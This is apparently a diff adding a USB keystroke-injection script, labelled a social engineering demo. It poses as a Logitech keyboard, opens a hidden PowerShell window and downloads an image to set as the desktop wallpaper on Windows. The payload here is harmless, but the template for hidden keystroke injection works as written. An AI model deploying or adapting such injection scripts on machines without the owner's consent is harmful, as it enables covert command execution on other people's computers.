@@ -1,0 +1,20 @@
+REM Title: Wallpaper Change
+REM Author: Community
+REM Target: Windows 10/11
+REM Description: Downloads and sets a new desktop wallpaper
+REM Demo / social engineering test
+REM
+ID 046D:C31C Logitech USB Keyboard
+
+DELAY 1500
+
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Download an image and set as wallpaper - change URL to your image
+STRING $url="https://wallpaperaccess.com/full/1077823.jpg"; $path="$env:TEMP\wallpaper.jpg"; Invoke-WebRequest -Uri $url -OutFile $path; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Wallpaper{[DllImport("user32.dll",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);}'; [Wallpaper]::SystemParametersInfo(20,0,$path,3)
+ENTER
+DELAY 3000
